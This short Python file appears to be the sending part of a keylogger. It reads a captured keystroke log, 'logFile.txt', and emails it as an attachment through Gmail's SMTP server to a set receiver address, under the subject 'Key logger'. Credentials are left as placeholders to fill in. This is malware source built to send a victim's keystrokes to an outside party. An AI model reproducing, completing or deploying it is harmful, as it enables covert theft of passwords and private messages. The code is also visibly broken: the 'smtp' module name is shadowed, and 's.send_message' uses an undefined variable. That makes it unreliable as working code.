
import smtplib as smtp
from email.message import EmailMessage

SENDER = 'example@gmail.com'   # put your gmail account here , to send from.
RECEIVER = 'example@exmpl.com' # email address to send to.
PASSWORD = 'password' # gmail application password .


def send():
    with smtp.SMTP_SSL('smtp.gmail.com',465) as smtp:

        smtp.login(SENDER,PASSWORD)
        message = EmailMessage()
        message['subject'] = 'Key logger'
        message['From'] = SENDER
        message['To'] = RECEIVER
        with open('logFile.txt','r') as logFile:
            fileData = logFile.read()

        message.add_attachment(fileData,subtype = 'text',filename = 'logFile.txt')
        s.send_message(message)
